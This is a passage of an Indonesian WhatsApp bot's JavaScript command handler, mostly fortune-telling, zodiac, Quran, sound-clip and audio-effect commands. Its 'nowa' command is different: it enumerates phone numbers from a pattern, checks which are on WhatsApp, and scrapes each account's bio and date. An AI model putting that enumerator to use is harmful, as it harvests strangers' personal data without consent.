let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return anjay(anu.message)
haikal.sendImage(m.chat,anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} Haikal, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'verifikasi':{
if (isRegistered) return anjay('Akun Kamu Sudah Terverfikasi!!!')
await sendButRegis(from)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
 if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await haikal.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted:hw })
break
//=================================================//
//=================================================//
case 'nowa': {
if (isBan) return sticBanLu(from)
if (!args[0]) return anjay(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return anjay('lah?')
anjay(mess.wait)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await haikal.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await haikal.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
anjay(`${nomerny}${no_bio}${no_watsap}`)
}
break
//=================================================//
//=================================================//
case 'zodiak': case 'zodiac': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix+ command} 7 7 2005`
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
let anu = await primbon.shio(text)
if (anu.status == false) return anjay(anu.message)
haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================// 
//=================================================//
case 'ringtone': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} black rover`
let { ringtone } = require('./baseikal/lib/scraper')
let anu = await ringtone(text)
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: hw })
}
break
//=================================================//
case 'iqra': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
if (!text) throw oh
yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:hw}).catch ((err) => anjay(oh))
}
break
//=================================================//
case 'juzamma': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (args[0] === 'pdf') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:hw})
} else if (args[0] === 'docx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:hw})
} else if (args[0] === 'pptx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:hw})
} else if (args[0] === 'xlsx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:hw})
} else {
anjay(`Mau format apa ? Example : ${prefix + command} pdf
Format yang tersedia : pdf, docx, pptx, xlsx`)
}
}
break
//=================================================//
case 'hadis': case 'hadist': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1
Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
anjay(`No. ${number}
${arab}
${id}`)
} catch (e) {
anjay(`Hadis tidak ditemukan !`)
}
}
break
//=================================================//
case 'alquran': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
anjay(txt)
haikal.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : hw })
}
break
//=================================================//
case 'tafsirsurah': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*」
*Pendek* : ${res.result.data.tafsir.id.short}
*Panjang* : ${res.result.data.tafsir.id.long}
( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
anjay(txt)
}
break
//=================================================//
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
try {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return anjay(err)
let buff = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : hw })
fs.unlinkSync(ran)
})
} else anjay(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
anjay(e)
}
break
//=================================================//
case 'setcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
anjay(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
anjay(`Done!`)
}
break
//=================================================//
case 'listcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
haikal.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'lockcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
global.db.data.sticker[hash].locked = !/^un/i.test(command)
anjay('Done!')
}
break
//=================================================//
case 'addmsg': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
if (!text) throw `Example : ${prefix + command} nama file`
let msgs = global.db.data.database
if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
msgs[text.toLowerCase()] = quoted.fakeObj
anjay(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
//=================================================//
case 'getmsg': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
haikal.copyNForward(m.chat, msgs[text.toLowerCase()], true)
}
break
//=================================================//
case 'listmsg': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let msgs = JSON.parse(fs.readFileSync('./baseikal/dbnye/database.json'))
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
anjay(teks)
}
break
//=================================================//
case 'delmsg': case 'deletemsg': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return anjay(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
anjay(`Berhasil menghapus '${text}' dari list pesan`)
}
break
//=================================================//

case 'public': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
haikal.public = true
anjay('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
